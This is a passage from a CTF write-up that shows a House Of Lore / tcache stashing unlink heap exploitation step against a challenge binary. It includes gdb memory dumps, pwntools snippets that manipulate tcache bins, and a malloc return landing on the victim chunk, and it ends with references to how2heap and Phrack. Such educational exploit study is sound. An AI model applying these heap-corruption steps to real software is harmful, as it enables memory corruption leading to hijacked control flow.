</span><span style=color:#ffb454>0x555555559130:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559140:</span><span>	0x0000000000000000	0x0000000000000000
</span><span style=color:#ffb454>0x555555559150:</span><span>	0x00007ffff7fefec8	0x0000000000000000 -</span><span style=color:#f29668>></span><span> Our victim chunk landed on tcache
</span></code></pre><p>With yet another malloc call , we get our victim chunk back. The binary poses a constraint here , we can malloc only when the 0x220 tcache is filled. So let's do that first and then call malloc.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'T'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
</span><span>gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
</span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>) </span><span style=font-style:italic;color:#5c6773>#Refill tcache
</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'P'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x300</span><span>) </span><span style=font-style:italic;color:#5c6773>#Padding chunk to prevent top consolidation
</span></code></pre><p>Finally call malloc and get victim.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'50056'</span><span>)
</span><span>io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(</span><span style=color:#c2d94c>'a'</span><span>)
</span></code></pre><p>And Boom , malloc gives us our victim chunk back.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>RAX:</span><span> 0x7ffff7fefec8 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x55555555a140 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555559f20 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555559d00 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555559ae0 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x5555555598c0 (--</span><span style=color:#f29668>></span><span> ...)
</span><span>
</span></code></pre><p>We can see the return value of malloc in <code>RAX</code> register , which is nothing but our victim chunk.<h2 id=conclusion>Conclusion</h2><p>The idea was just to understand how House Of Lore works and it is not the intended solution for this challenge. On the other hand , to get control flow , we still have to ramble a little more to get things working in our favour.<p>In the coming post , I will discuss how we can use House Of Lore twice and get <code>malloc_hook</code> allocated on tcache. {: .notice}<h2 id=references>References</h2><ol><li>Shellfish's <a href=https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_stashing_unlink_attack.c>how2heap</a><li><a href=http://phrack.org/issues/67/8.html>Phrack</a></ol></section></article></main></div>